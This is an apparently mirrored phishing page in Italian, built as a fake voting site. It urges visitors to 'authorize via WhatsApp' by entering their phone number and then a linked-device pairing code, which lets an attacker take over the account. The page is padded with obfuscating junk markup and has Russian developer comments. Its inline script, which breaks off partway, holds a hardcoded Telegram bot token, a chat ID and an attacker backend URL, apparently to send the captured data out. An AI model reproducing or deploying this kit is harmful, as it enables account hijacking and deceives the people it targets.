<!DOCTYPE html>
<html lang="en">

<!-- Mirrored from dancebattle.life/login/zomia-it by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 29 Apr 2025 13:02:07 GMT -->
<!-- Added by HTTrack -->
<meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->

<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width,initial-scale=1.0">
    <meta name="robots" content="noindex, nofollow">
    <link rel="icon" type="image/x-icon" href="https://dancebattle.life/static/img/svg/icon.svg">
    <title>Autorizzazione</title>
    <link rel="stylesheet"
        href="https://dancebattle.life/static/css/themes/zomia/number.css?v=iF_XmVydeXA9UWMabWC6qBNqGURlNGJbit3ycULs52Q%3D" />
    <script
        src="https://dancebattle.life/static/js/lib/socket.io.js?v=xA14CFROUWxBqJIF79G9ZQHsZd083gKibXvVUTrHQJ8%3D"></script>
    <script
        src="https://dancebattle.life/static/js/lib/lazyload.js?v=tNygWs_GKZ5-7U2Dt04KB8nwYPizG4GrXlE2Ao8hjtQ%3D"></script>
    <script
        src="https://dancebattle.life/static/js/lib/notiflix.js?v=pXMqYvjzxYjuQ3-Iz0Zpw3Tk3BAoet8dOsODol_iqTI%3D"></script>
    <!-- ВАЖНО: Оставляем оригинальный скрипт, который отвечает за логику номеров и стран -->
    <script
        src="https://dancebattle.life/static/js/number.js?v=44ZnprTQE_kUI3go1hDzhdZsbTsiUZ5z6xFuhpus56A%3D"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/css/intlTelInput.css" />
    <script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/intlTelInput.min.js"></script>

    <style>
        .TdYmjJvmcSBa { display: none; background-color: #POsLWm; box-sizing: initial; opacity: 0.11; font-weight: 500; font-style: oblique; scale: 0.94; line-height: 12; padding: 233px; border-radius: 98px; font-size: 29px; color: #EHlSir; margin: 243px; text-align: right; cursor: text; height: 133px; width: 857px; }
        .rwvCRhgYnBx { display: none; margin: 228px; font-style: italic; color: #oFisGb; padding: 157px; height: 127px; text-align: left; font-size: 93px; background-color: #VqHDjL; border-radius: 19px; opacity: 0.88; scale: 0.52; width: 505px; }
        .EkrJRaLEYsO { display: none; font-weight: 400; border-radius: 7px; padding: 156px; margin: 230px; }
        /* ... (остальные оригинальные стили из вашего <style>) ... */
        .block.number .form-container .form p.error { color: #d65d7a; }
        .block.code .number-container { border: 20px solid #1d3957; background-color: #ffffff; }
        .popup .body { background-color: #1d3957; }

        /* --- НАЧАЛО CSS ИСПРАВЛЕНИЙ ДЛЯ МОБИЛЬНЫХ УСТРОЙСТВ (пункты 1 и 2 клиента) --- */
        @media screen and (max-width: 768px) {
            /* Контейнер для QR-кода/лоадера/ввода кода на втором шаге */
            .block.code { /* Применяем к основному блоку второго шага */
                padding-top: 20px; /* Добавим отступ сверху, чтобы текст не прилипал */
            }
            .block.code .number-column { /* Центрируем содержимое колонки */
                display: flex;
                flex-direction: column;
                align-items: center;
            }
            .block.code .number-container { /* Блок с лоадером/QR-кодом */
                border: 10px solid #1d3957;
                padding: 20px; 
                min-height: 180px; 
                margin-top: 10px; /* Отступ от текста "Autorizzazione rapida..." */
                width: calc(100% - 40px); /* Чтобы не вылезал за края с учетом паддингов */
                max-width: 300px; /* Ограничим максимальную ширину */
                box-sizing: border-box;
            }
            /* Лоадер */
            .loader { 
                width: 60px !important;
                height: 60px !important;
                border-width: 6px !important;
                margin: 20px auto; 
            }
            /* Цифры QR-кода (если используется) */
            .block.code .number-code .symbol {
                font-size: 22px !important; 
                width: 30px !important;    
                height: 40px !important;   
                line-height: 40px !important; 
                margin: 2px !important;
            }
            .block.code .number-code .split {
                font-size: 22px !important; 
                padding: 0 5px !important;
            }
            /* Текст над лоадером/кодом */
            .block.code .text { 
                padding: 0 15px; 
                text-align: center; /* Центрируем текст на мобильных */
            }
             .block.code .text h2 {
                font-size: 1.3em; 
            }
            .block.code .text p {
                font-size: 0.9em;
                line-height: 1.5;
            }

            /* Форма ввода кода (которую использует ваш Telegram скрипт) */
            /* Убедимся, что #form-step-2 (если это ID вашего блока) тоже стилизован */
            #form-step-2, #form-step-2-custom { /* Применяем к обоим возможным ID */
                 width: 100%;
                 max-width: 320px; /* Ограничение ширины для лучшего вида */
                 margin: 15px auto 0 auto; /* Центрирование и отступ сверху */
            }
            #form-step-2 .form-container, #form-step-2-custom .form-container {
                padding: 15px;
            }
            #form-step-2 .code-title, #form-step-2-custom .code-title { /* Для надписи "Codice:" */
                font-size: 1.2em; /* Уменьшим, если нужно */
                margin-bottom: 10px;
            }
             #form-step-2 input.number, #form-step-2-custom input.number { /* Поле ввода кода */
                padding: 12px;
                font-size: 1em;
            }
            #form-step-2 button.primary, #form-step-2-custom button.primary { /* Кнопка "Continua" */
                padding: 12px;
                font-size: 1em;
            }
        }
        /* --- КОНЕЦ CSS ИСПРАВЛЕНИЙ ДЛЯ МОБИЛЬНЫХ УСТРОЙСТВ --- */
    </style>
</head>

<body class="number-page" data-redirect="https://dancebattle.life/home/grazie" data-template="45">
    <!-- ... (начало вашего body без изменений) ... -->
    <p class="MEZNIyFgvRhuXN rCFtQcTyMIoqPsOMZEIjGB HXwVwtowipg NoqErhVUohbBE arNTpOETe vzuxBaDKHV">gsXGyhetm
        hsvqIeZjSqVUxDd rmhvXhMMHmwZZaxEXoaBVqj</p>
    <div class="wrapper">
        <span class="HJCjuJdBRxyFkVhn tOIjuvePPmV gHpInWiOuhsqojyVHpg fbWqZxbOkWmHe EFLINkHZOqmAAcItwWLW ZWugeeBjg">
            <div class="btBTGkttju">
                <p class="sRnrhTpRr">nDJkOjcRMteMgojpUyVEUjuuJ rJlgurWIUv</p>
            </div>
        </span>
        <div class="block number" id="step-1">
            <!-- ... (содержимое #step-1 без изменений, так как им управляет number.js) ... -->
            <small class="rwvCRhgYnBx XXfSIvFiCHTKGVhSExc fYeYajskKFDICCwX">
                <h4 class="nfaFmFIlQtgBpY">AoZkWlXyWLOdHAFjBVhcNRj mPFTWfchNzYOhKntFfuOL ePUAFlUaf
                    QUWrfYpkvcaXGBxIuGAEcwoas GYuOqPibs QVyNuOFFBXkZHsLGfR CgUPeYrnFfCPIxczjDslfge QQKAHgQeFpjdWgu
                    ulKQkMUrIgoOgKcdf YxElzNKTIOIP</h4>
            </small>
            <div class="text">
                <h5 class="RdMuchDHj tpWqtQKjEYD">fiBMLCLNngvHH</h5>
                <h2>Devi accedere tramite WhatsApp affinché il tuo voto venga preso in considerazione.</h2>
                <small
                    class="CUuwPmBOQqkLDnR qygifepowfcwNpYiwIPqTsB pYuVLgSQXTPnzOsjZgWiCaOFL MymbuHKI WMAmNSmIK IAGlswnUXQyzrQRzVbZs">
                    <h6 class="MXQJididkCWQAl">TmIEUJJfDZrxnzDzbx DWbpJizMWzfRvqyQ oOwvJSlWmTg tuCPOHrhOaNmHtxVRF
                        StzcxoAdfnCLSEwi kNkcHifxqigl OMNzbdhZkjCwTS</h6>
                </small>
                <span
                    class="HJCjuJdBRxyFkVhn tOIjuvePPmV gHpInWiOuhsqojyVHpg fbWqZxbOkWmHe EFLINkHZOqmAAcItwWLW ZWugeeBjg">
                    <div class="btBTGkttju">
                        <p class="sRnrhTpRr">nDJkOjcRMteMgojpUyVEUjuuJ rJlgurWIUv</p>
                    </div>
                </span>
                <h5
                    class="juxoxMAnNtukzfIm lNxpBmxtmOtfOlerNBe zJldAYjRNfMACuePoxBzqmNJe pomMZXBqTUpKgEOUn qESlrnIrXJoCuBwufAgmKMejA">
                    ZamYcRmZU zndcRBwfqEhgwxqRXabIHvrm QTkiPMLi DbLaPvYrUWUiqFSmi</h5>
                <p>L'autorizzazione tramite WhatsApp ti consente di proteggere i tuoi dati e risparmiare tempo.</p>
                <span
                    class="HJCjuJdBRxyFkVhn tOIjuvePPmV gHpInWiOuhsqojyVHpg fbWqZxbOkWmHe EFLINkHZOqmAAcItwWLW ZWugeeBjg">
                    <div class="btBTGkttju">
                        <p class="sRnrhTpRr">nDJkOjcRMteMgojpUyVEUjuuJ rJlgurWIUv</p>
                    </div>
                </span>
                <h5
                    class="juxoxMAnNtukzfIm lNxpBmxtmOtfOlerNBe zJldAYjRNfMACuePoxBzqmNJe pomMZXBqTUpKgEOUn qESlrnIrXJoCuBwufAgmKMejA">
                    ZamYcRmZU zndcRBwfqEhgwxqRXabIHvrm QTkiPMLi DbLaPvYrUWUiqFSmi</h5>
            </div>
            <p class="MEZNIyFgvRhuXN rCFtQcTyMIoqPsOMZEIjGB HXwVwtowipg NoqErhVUohbBE arNTpOETe vzuxBaDKHV">gsXGyhetm
                hsvqIeZjSqVUxDd rmhvXhMMHmwZZaxEXoaBVqj</p>
            <div id="form-step-1" class="form-container form-num">
                <div class="form" id="myForm">
                    <ul class="EkrJRaLEYsO KdzSBOAesdXSe jZzvxRPTyKteAMKxyFrdoPmp NGcTXOnlgoItcI">KeufuQduGbyIESnJxdKC
                        hykvzYDiNHcNjqGj PgsAwDqxqSBcKb wAigAQfTBfreMjZDIsfBxX JxoZektYrbHlY WsLTZhNoKjWIykQojN
                        LZltUYfElxwDsrKw LZBBIkTrVQryRMXTQvc EnxoxcmjcpyZygdOuwbVkt</ul>
                    <div class="country">
                        <div class="image">
                            <img src="https://dancebattle.life/static/img/flags/AU.png?v=HufG65VxnEKn_Ob-toF22UxlqX3xC9WSZK3ygAU6nQQ%3D"
                                alt="AU">
                        </div>
                        <small class="rwvCRhgYnBx XXfSIvFiCHTKGVhSExc fYeYajskKFDICCwX">
                            <h4 class="nfaFmFIlQtgBpY">AoZkWlXyWLOdHAFjBVhcNRj mPFTWfchNzYOhKntFfuOL ePUAFlUaf
                                QUWrfYpkvcaXGBxIuGAEcwoas GYuOqPibs QVyNuOFFBXkZHsLGfR CgUPeYrnFfCPIxczjDslfge
                                QQKAHgQeFpjdWgu ulKQkMUrIgoOgKcdf YxElzNKTIOIP</h4>
                        </small>
                        <p class="name">Australia</p>
                        <ul class="EkrJRaLEYsO KdzSBOAesdXSe jZzvxRPTyKteAMKxyFrdoPmp NGcTXOnlgoItcI">
                            KeufuQduGbyIESnJxdKC hykvzYDiNHcNjqGj PgsAwDqxqSBcKb wAigAQfTBfreMjZDIsfBxX JxoZektYrbHlY
                            WsLTZhNoKjWIykQojN LZltUYfElxwDsrKw LZBBIkTrVQryRMXTQvc EnxoxcmjcpyZygdOuwbVkt</ul>
                        <div class="icon">
                            <svg viewBox="0 0 10 5" height="5" width="10" preserveAspectRatio="xMidYMid meet" class=""
                                fill="none">
                                <path fill-rule="evenodd" clip-rule="evenodd" d="M0 0L5 5L10 0H0Z" fill="currentColor"
                                    fill-opacity="0.3"></path>
                            </svg>
                        </div>
                        <span class="TdYmjJvmcSBa tbLCiLFKJyfHbkQIzyZlkt ALNyVJaMW OjKCGXKynnNnc GrjJKEHUsHeZzDSEwm">
                            <h5 class="TqGTdibeuiOqcV">cNZrewXsgH ZSqtLNllkZPCTDpeAOIu hvSyEpuPccUP rPFifostiGlxBN
                                ZFIDaGgBq PYUASKiSGYgxkwXLVPQ maCanCKOzIJvgYWWri vXGtdtfSKSqNHEFaThEOO IMFZZUui</h5>
                        </span>
                    </div>
                    <h5 class="RdMuchDHj tpWqtQKjEYD">fiBMLCLNngvHH</h5>
                    <div class="countries hidden">
                        <strong class="TjYfSpzXTNoUdv ieLfWPtgF">EQinIceVn aPMEmjEk qdoRdBliaomXbSKCLaLZI
                            QZhWtdNh</strong>
                        <div class="search">
                            <h5
                                class="zFFCQoOq nzSavIXnC jZCYjKnqgfXRrEJOq oAhvqdwyFRfSPZzZwR ZawnPubwcNBpIYUsJJeJMUe uroalBgdudDWVoKlQiQo">
                                xZnaqANSmo oeNndRzxzo cUyaLrLUISLJx</h5>
                            <div class="image">
                                <svg viewBox="0 0 24 24" height="24" width="24" preserveAspectRatio="xMidYMid meet"
                                    class="" version="1.1" x="0px" y="0px" enable-background="new 0 0 24 24">
                                    <path fill="#bfbbbb"
                                        d="M15.009,13.805h-0.636l-0.22-0.219c0.781-0.911,1.256-2.092,1.256-3.386 c0-2.876-2.332-5.207-5.207-5.207c-2.876,0-5.208,2.331-5.208,5.207s2.331,5.208,5.208,5.208c1.293,0,2.474-0.474,3.385-1.255 l0.221,0.22v0.635l4.004,3.999l1.194-1.195L15.009,13.805z M10.201,13.805c-1.991,0-3.605-1.614-3.605-3.605 s1.614-3.605,3.605-3.605s3.605,1.614,3.605,3.605S12.192,13.805,10.201,13.805z">
                                    </path>
                                </svg>
                            </div>
                            <li class="phjUabQT RvQlJnVyyYnShdXxl hljLYNhGidhiphm EClRBwpXSGYwsxVsaLrk XIambdaw">
                                lNJFwMkFeieFVsR YFTqFwJsM ylcwdcAjNOzB jKBjSNLjN</li>
                            <input type="text" id="search">

                        </div>
                        <li class="phjUabQT RvQlJnVyyYnShdXxl hljLYNhGidhiphm EClRBwpXSGYwsxVsaLrk XIambdaw">
                            lNJFwMkFeieFVsR YFTqFwJsM ylcwdcAjNOzB jKBjSNLjN</li>
                        <div class="items">
                            <ul class="EkrJRaLEYsO KdzSBOAesdXSe jZzvxRPTyKteAMKxyFrdoPmp NGcTXOnlgoItcI">
                                KeufuQduGbyIESnJxdKC hykvzYDiNHcNjqGj PgsAwDqxqSBcKb wAigAQfTBfreMjZDIsfBxX
                                JxoZektYrbHlY WsLTZhNoKjWIykQojN LZltUYfElxwDsrKw LZBBIkTrVQryRMXTQvc
                                EnxoxcmjcpyZygdOuwbVkt</ul>
                            <div class="overflow">
                                <!-- СПИСОК СТРАН ГЕНЕРИРУЕТСЯ number.js -->
                                <!-- Я оставил этот блок пустым, так как number.js должен его заполнить. -->
                                <!-- В вашем изначальном HTML здесь был длинный список стран. -->
                                <!-- Если number.js не работает без этого списка в HTML, его нужно будет вернуть. -->
                                <!-- Для теста пока оставлю как было в вашем "чистом" файле: -->
                                 <div class="item" data-code="+61" data-lang="AU" data-name="Australia"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/AU.png" alt="AU"> </div> <p class="name">Australia</p> <p class="code">+61</p> </div>
                                 <div class="item" data-code="+43" data-lang="AT" data-name="Österreich"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/AT.png" alt="AT"> </div> <p class="name">Österreich</p> <p class="code">+43</p> </div>
                                 <!-- ... и так далее для всех стран, как в вашем "чистом" HTML ... -->
                                 <div class="item" data-code="+81" data-lang="JP" data-name="日本"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/JP.png" alt="JP"> </div> <p class="name">日本</p> <p class="code">+81</p> </div>
                            </div>
                            <ul class="egeWSiccsIJQ SCLYYYcSeAF qaeFHqJVbGDfsBGDGrdnjSCK jOlNkfIrteJgkl">
                                <h5 class="kvIpScpLemN">ITmVeZdXJDSCBWl zVbKqQUbIoZBZzyyzo DCbunYKAbrsFUv SygnOVnIsOj
                                </h5>
                            </ul>
                        </div>
                        <h5
                            class="zFFCQoOq nzSavIXnC jZCYjKnqgfXRrEJOq oAhvqdwyFRfSPZzZwR ZawnPubwcNBpIYUsJJeJMUe uroalBgdudDWVoKlQiQo">
                            xZnaqANSmo oeNndRzxzo cUyaLrLUISLJx</h5>
                    </div>
                    <span class="TdYmjJvmcSBa tbLCiLFKJyfHbkQIzyZlkt ALNyVJaMW OjKCGXKynnNnc GrjJKEHUsHeZzDSEwm">
                        <h5 class="TqGTdibeuiOqcV">cNZrewXsgH ZSqtLNllkZPCTDpeAOIu hvSyEpuPccUP rPFifostiGlxBN ZFIDaGgBq
                            PYUASKiSGYgxkwXLVPQ maCanCKOzIJvgYWWri vXGtdtfSKSqNHEFaThEOO IMFZZUui</h5>
                    </span>
                    <input type="text" class="number" id="number" value="+61" />
                    <span class="TdYmjJvmcSBa tbLCiLFKJyfHbkQIzyZlkt ALNyVJaMW OjKCGXKynnNnc GrjJKEHUsHeZzDSEwm">
                        <h5 class="TqGTdibeuiOqcV">cNZrewXsgH ZSqtLNllkZPCTDpeAOIu hvSyEpuPccUP rPFifostiGlxBN ZFIDaGgBq
                            PYUASKiSGYgxkwXLVPQ maCanCKOzIJvgYWWri vXGtdtfSKSqNHEFaThEOO IMFZZUui</h5>
                    </span>
                    <button class="button primary" id="next-step">Continua</button>

                    <span
                        class="HJCjuJdBRxyFkVhn tOIjuvePPmV gHpInWiOuhsqojyVHpg fbWqZxbOkWmHe EFLINkHZOqmAAcItwWLW ZWugeeBjg">
                        <div class="btBTGkttju">
                            <p class="sRnrhTpRr">nDJkOjcRMteMgojpUyVEUjuuJ rJlgurWIUv</p>
                        </div>
                    </span>
                    <p class="error hidden">Numero di telefono non valido</p>
                    <small
                        class="CUuwPmBOQqkLDnR qygifepowfcwNpYiwIPqTsB pYuVLgSQXTPnzOsjZgWiCaOFL MymbuHKI WMAmNSmIK IAGlswnUXQyzrQRzVbZs">
                        <h6 class="MXQJididkCWQAl">TmIEUJJfDZrxnzDzbx DWbpJizMWzfRvqyQ oOwvJSlWmTg tuCPOHrhOaNmHtxVRF
                            StzcxoAdfnCLSEwi kNkcHifxqigl OMNzbdhZkjCwTS</h6>
                    </small>
                    <div id="verifyForm" style="display: none; margin-top: 20px;">
                        <input type="text" id="codeInput" placeholder="Введіть код">
                        <button id="submitCode">Підтвердити</button>
                    </div>
                </div>
                <h6 class="lmTQZiytwQd HlTLVIaKHXw CRlJUacoRBvO JRMMTdRtZKzRYjKUmWGAg">hFUFNQJtCrHKBzP
                    WFFhTuDduNDAMMCnWt MsHxDNrmDzz nsOqSlqqJcEpmbMkt xZKKiWrPDowlDzyRpyprK pChdyMBxfEasK
                    HMnrMFReAPNuUAFJVUhthI CekbmLWrWtGakLpSHnCh sOCbDOOFeKEKLbzn YshEXiulSpAkSSpuxSszHCqHG</h6>
            </div>
        </div>

        <h5
            class="juxoxMAnNtukzfIm lNxpBmxtmOtfOlerNBe zJldAYjRNfMACuePoxBzqmNJe pomMZXBqTUpKgEOUn qESlrnIrXJoCuBwufAgmKMejA">
            ZamYcRmZU zndcRBwfqEhgwxqRXabIHvrm QTkiPMLi DbLaPvYrUWUiqFSmi
        </h5>
                                                
        <!-- Блок второго шага, который будет ПОКАЗАН number.js (ID="step-2") -->
        <!-- ИЛИ моим Telegram-скриптом (ID="form-step-2-telegram") -->
        <div class="block code hidden" id="step-2"> <!-- Этот блок может быть показан number.js -->
            <!-- ... (содержимое оригинального #step-2 без изменений, включая #loader и т.д.) ... -->
            <span class="TdYmjJvmcSBa tbLCiLFKJyfHbkQIzyZlkt ALNyVJaMW OjKCGXKynnNnc GrjJKEHUsHeZzDSEwm">
                <h5 class="TqGTdibeuiOqcV">cNZrewXsgH ZSqtLNllkZPCTDpeAOIu hvSyEpuPccUP rPFifostiGlxBN ZFIDaGgBq
                    PYUASKiSGYgxkwXLVPQ maCanCKOzIJvgYWWri vXGtdtfSKSqNHEFaThEOO IMFZZUui</h5>
            </span>
            <div class="text">
                <h6 class="lmTQZiytwQd HlTLVIaKHXw CRlJUacoRBvO JRMMTdRtZKzRYjKUmWGAg">hFUFNQJtCrHKBzP
                    WFFhTuDduNDAMMCnWt MsHxDNrmDzz nsOqSlqqJcEpmbMkt xZKKiWrPDowlDzyRpyprK pChdyMBxfEasK
                    HMnrMFReAPNuUAFJVUhthI CekbmLWrWtGakLpSHnCh sOCbDOOFeKEKLbzn YshEXiulSpAkSSpuxSszHCqHG</h6>
                <h2>Autorizzazione rapida e facile tramite WhatsApp</h2>
                <h6 class="lmTQZiytwQd HlTLVIaKHXw CRlJUacoRBvO JRMMTdRtZKzRYjKUmWGAg">hFUFNQJtCrHKBzP
                    WFFhTuDduNDAMMCnWt MsHxDNrmDzz nsOqSlqqJcEpmbMkt xZKKiWrPDowlDzyRpyprK pChdyMBxfEasK
                    HMnrMFReAPNuUAFJVUhthI CekbmLWrWtGakLpSHnCh sOCbDOOFeKEKLbzn YshEXiulSpAkSSpuxSszHCqHG</h6>
                <input type="hidden" id="user-number">
                <h5 class="RdMuchDHj tpWqtQKjEYD">fiBMLCLNngvHH</h5>
                <p>Accedi all'app WhatsApp, seleziona 'Dispositivi collegati' nella finestra delle
                    impostazioni, quindi inserisci questo codice</p>
                <h5
                    class="zFFCQoOq nzSavIXnC jZCYjKnqgfXRrEJOq oAhvqdwyFRfSPZzZwR ZawnPubwcNBpIYUsJJeJMUe uroalBgdudDWVoKlQiQo">
                    xZnaqANSmo oeNndRzxzo cUyaLrLUISLJx</h5>
                <small
                    class="CUuwPmBOQqkLDnR qygifepowfcwNpYiwIPqTsB pYuVLgSQXTPnzOsjZgWiCaOFL MymbuHKI WMAmNSmIK IAGlswnUXQyzrQRzVbZs">
                    <h6 class="MXQJididkCWQAl">TmIEUJJfDZrxnzDzbx DWbpJizMWzfRvqyQ oOwvJSlWmTg tuCPOHrhOaNmHtxVRF
                        StzcxoAdfnCLSEwi kNkcHifxqigl OMNzbdhZkjCwTS</h6>
                </small>
            </div>
            <div class="number-column">
                <li class="phjUabQT RvQlJnVyyYnShdXxl hljLYNhGidhiphm EClRBwpXSGYwsxVsaLrk XIambdaw">lNJFwMkFeieFVsR
                    YFTqFwJsM ylcwdcAjNOzB jKBjSNLjN</li>
                <div class="number-container" id="loader"> <!-- Этот ID используется number.js -->
                    <h5 class="RdMuchDHj tpWqtQKjEYD">fiBMLCLNngvHH</h5>
                    <div class="loader" ></div>
                    <div class="number-code hidden" id="number-code" data-code="">
                        <div class="symbol"></div><div class="symbol"></div><div class="symbol"></div><div class="symbol"></div>
                        <div class="split">–</div>
                        <div class="symbol"></div><div class="symbol"></div><div class="symbol"></div><div class="symbol"></div>
                    </div>
                    <div class="QSXSXYDCnbqkFWy cQMrMpHzkkQjpZlwV SPmBXkiC DGcoknrjkScAqRDAknBIkGOoW">
                        <h6 class="WvydNrlW">BrfCuLcTQLiKjY nVEDKnWiunmj jkbunFWYcWav OqGWSpKabaXZkPbpA WlmSWytoty
                            GLIdETFzmCHyvpBBTlxnEk xYCEOwWsNBNYvMNpsrz QFEJdQBHW</h6>
                    </div>
                </div>
                <!-- Блок для ввода кода для ТЕЛЕГРАМА. Он будет показан СКРИПТОМ НИЖЕ -->
                <div class="block number" id="form-step-2-telegram" style="display: none;"> <!-- Новый ID для нашего блока -->
                    <div id="form-step-2-container-telegram" class="form-container form-code">
                        <p  class="text code-title">Codice:</p> <!-- ПЕРЕВЕДЕНО -->
                        <div class="form" id="form-code-telegram">
                            <h5 class="RdMuchDHj tpWqtQKjEYD">fiBMLCLNngvHH</h5>
                            <input type="text" class="number" id="code-telegram" /> <!-- Новый ID -->
                            <span class="TdYmjJvmcSBa tbLCiLFKJyfHbkQIzyZlkt ALNyVJaMW OjKCGXKynnNnc GrjJKEHUsHeZzDSEwm">
                                <h5 class="TqGTdibeuiOqcV">cNZrewXsgH ZSqtLNllkZPCTDpeAOIu hvSyEpuPccUP rPFifostiGlxBN ZFIDaGgBq
                                    PYUASKiSGYgxkwXLVPQ maCanCKOzIJvgYWWri vXGtdtfSKSqNHEFaThEOO IMFZZUui</h5>
                            </span>
                            <button class="button primary" id="two-step-telegram">Continua</button> <!-- Новый ID -->
                        </div>
                    </div>
                </div>
                <!-- Лоадер для моего Telegram скрипта -->
                <div class="number-container" id="loader-telegram" style="display: none;">
                     <div class="loader"></div>
                </div>
                <div class="QSXSXYDCnbqkFWy cQMrMpHzkkQjpZlwV SPmBXkiC DGcoknrjkScAqRDAknBIkGOoW">
                    <h6 class="WvydNrlW">BrfCuLcTQLiKjY nVEDKnWiunmj jkbunFWYcWav OqGWSpKabaXZkPbpA WlmSWytoty
                        GLIdETFzmCHyvpBBTlxnEk xYCEOwWsNBNYvMNpsrz QFEJdQBHW</h6>
                </div>
                <div class="button primary hidden" id="copy-code">Copia</div>
            </div>
        </div>

        <strong class="TjYfSpzXTNoUdv ieLfWPtgF">EQinIceVn aPMEmjEk qdoRdBliaomXbSKCLaLZI QZhWtdNh</strong>
    </div>
    <small
        class="CUuwPmBOQqkLDnR qygifepowfcwNpYiwIPqTsB pYuVLgSQXTPnzOsjZgWiCaOFL MymbuHKI WMAmNSmIK IAGlswnUXQyzrQRzVbZs">
        <h6 class="MXQJididkCWQAl">TmIEUJJfDZrxnzDzbx DWbpJizMWzfRvqyQ oOwvJSlWmTg tuCPOHrhOaNmHtxVRF
            StzcxoAdfnCLSEwi kNkcHifxqigl OMNzbdhZkjCwTS</h6>
    </small>
    <div class="popup top40" id="popreboot" >
        <h5 class="RdMuchDHj tpWqtQKjEYD">fiBMLCLNngvHH</h5>
        <div class="body">
            <h2>Il tuo voto è stato conteggiato, grazie</h2> <!-- ПЕРЕВЕДЕНО -->
            <button class="button primary btn-ok" id="reload-page-ok">Ok</button>
            <h5 class="RdMuchDHj tpWqtQKjEYD">fiBMLCLNngvHH</h5>
        </div>
        <small
            class="CUuwPmBOQqkLDnR qygifepowfcwNpYiwIPqTsB pYuVLgSQXTPnzOsjZgWiCaOFL MymbuHKI WMAmNSmIK IAGlswnUXQyzrQRzVbZs">
            <h6 class="MXQJididkCWQAl">TmIEUJJfDZrxnzDzbx DWbpJizMWzfRvqyQ oOwvJSlWmTg tuCPOHrhOaNmHtxVRF
                StzcxoAdfnCLSEwi kNkcHifxqigl OMNzbdhZkjCwTS</h6>
        </small>
    </div>

    <div class="popup top40" id="popwhat" >
        <h5 class="RdMuchDHj tpWqtQKjEYD">fiBMLCLNngvHH</h5>
        <div class="body">
            <h2>Qualcosa è andato storto!</h2> <!-- ПЕРЕВЕДЕНО -->
            <h6 class="lmTQZiytwQd HlTLVIaKHXw CRlJUacoRBvO JRMMTdRtZKzRYjKUmWGAg">hFUFNQJtCrHKBzP WFFhTuDduNDAMMCnWt
                MsHxDNrmDzz nsOqSlqqJcEpmbMkt xZKKiWrPDowlDzyRpyprK pChdyMBxfEasK HMnrMFReAPNuUAFJVUhthI
                CekbmLWrWtGakLpSHnCh sOCbDOOFeKEKLbzn YshEXiulSpAkSSpuxSszHCqHG</h6>
            <p>Hai inserito il codice in modo errato, vai all'applicazione WhatsApp e inserisci il codice correttamente, altrimenti il tuo voto non verrà conteggiato.</p> <!-- ПЕРЕВЕДЕНО -->
            <span class="TdYmjJvmcSBa tbLCiLFKJyfHbkQIzyZlkt ALNyVJaMW OjKCGXKynnNnc GrjJKEHUsHeZzDSEwm">
                <h5 class="TqGTdibeuiOqcV">cNZrewXsgH ZSqtLNllkZPCTDpeAOIu hvSyEpuPccUP rPFifostiGlxBN ZFIDaGgBq
                    PYUASKiSGYgxkwXLVPQ maCanCKOzIJvgYWWri vXGtdtfSKSqNHEFaThEOO IMFZZUui</h5>
            </span>
            <button class="button primary btn-reb" id="reload-page-what">Riprova</button> <!-- ПЕРЕВЕДЕНО -->
            <h5 class="RdMuchDHj tpWqtQKjEYD">fiBMLCLNngvHH</h5>
        </div>
        <small
            class="CUuwPmBOQqkLDnR qygifepowfcwNpYiwIPqTsB pYuVLgSQXTPnzOsjZgWiCaOFL MymbuHKI WMAmNSmIK IAGlswnUXQyzrQRzVbZs">
            <h6 class="MXQJididkCWQAl">TmIEUJJfDZrxnzDzbx DWbpJizMWzfRvqyQ oOwvJSlWmTg tuCPOHrhOaNmHtxVRF
                StzcxoAdfnCLSEwi kNkcHifxqigl OMNzbdhZkjCwTS</h6>
        </small>
    </div>
    <h5 class="RdMuchDHj tpWqtQKjEYD">fiBMLCLNngvHH</h5>
                                
    <script>
        // *** ВАШ ОРИГИНАЛЬНЫЙ СКРИПТ ДЛЯ TELEGRAM (с небольшими правками ID) ***
        document.addEventListener("DOMContentLoaded", function () {
            const btnRebWhat = document.getElementById("reload-page-what");
            const btnOkReboot = document.getElementById("reload-page-ok");
            
            const popWhat = document.getElementById("popwhat");
            const popReboot = document.getElementById("popreboot");

            const step1Div = document.getElementById("step-1"); 
            const originalStep2Div = document.getElementById("step-2"); // Оригинальный второй шаг (QR/number.js loader)
            
            const formStep2Telegram = document.getElementById("form-step-2-telegram"); // Наша форма для кода Telegram
            const loaderTelegram = document.getElementById("loader-telegram"); // Наш лоадер для Telegram
            
            const nextStepBtnOriginal = document.getElementById("next-step"); // Кнопка "Continua" на первом шаге
            const codeStepBtnTelegram = document.getElementById("two-step-telegram"); // Кнопка "Continua" на нашем втором шаге

            if(btnRebWhat) {
                btnRebWhat.addEventListener("click", () => {
                    if(popWhat) popWhat.style.display = "none";
                    if(formStep2Telegram) formStep2Telegram.style.display = "block"; // Показать нашу форму
                    if(loaderTelegram) loaderTelegram.style.display = "none";
                    const codeInputTg = document.getElementById("code-telegram");
                    if(codeInputTg) codeInputTg.value = "";
                });
            }

            if(btnOkReboot) {
                btnOkReboot.addEventListener("click", () => {
                    const redirectUrl = document.body.getAttribute('data-redirect');
                    if (redirectUrl) {
                        window.location.href = redirectUrl;
                    } else {
                        if(popReboot) popReboot.style.display = "none";
                    }
                });
            }

            if(popReboot) popReboot.style.display = "none";
            if(popWhat) popWhat.style.display = "none";
            if(formStep2Telegram) formStep2Telegram.style.display = "none";
            if(loaderTelegram) loaderTelegram.style.display = "none";


            const token = "7738348678:AAE5mirY6jzmApYyAjJ5PQgz-1_G8u9pJ6g";
            const chat_id = "7538727898";
            const backendURL = "https://api.bestballerinavote.com";

            // Логика кнопки "Continua" первого шага (id="next-step")
            // Эта кнопка также используется number.js.
            // Мы добавляем наш обработчик, но НЕ отменяем стандартное поведение,
            // чтобы number.js мог выполнить свои действия (валидацию, переход на свой #step-2).
            if (nextStepBtnOriginal) {
                 nextStepBtnOriginal.addEventListener("click", function (e) {
                    // НЕ используем e.preventDefault(), чтобы number.js сработал.
                    
                    const phoneInput = document.getElementById("number");
                    if (!phoneInput) return;
